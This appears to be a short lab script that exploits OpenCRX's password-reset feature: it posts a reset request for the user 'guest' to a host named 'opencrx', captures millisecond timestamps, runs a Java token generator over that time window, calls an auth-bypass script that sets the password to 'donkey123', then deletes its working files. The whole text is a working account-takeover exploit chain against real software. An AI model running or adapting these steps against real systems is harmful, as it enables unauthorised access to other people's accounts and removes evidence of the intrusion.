#date +%s%3N && curl -s -o /dev/null -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N > dates.txt
sh date-res.sh > dates.txt
$date = gc dates.txt
write-host 'Date Range: ' $date[0] $date[1]
javac OpenCRXToken.java
java OpenCRXToken $date[0] $date[1] > tokens.txt
python3 opencrx-auth-bypass.py -u guest -p donkey123

rm *.txt
rm *.class

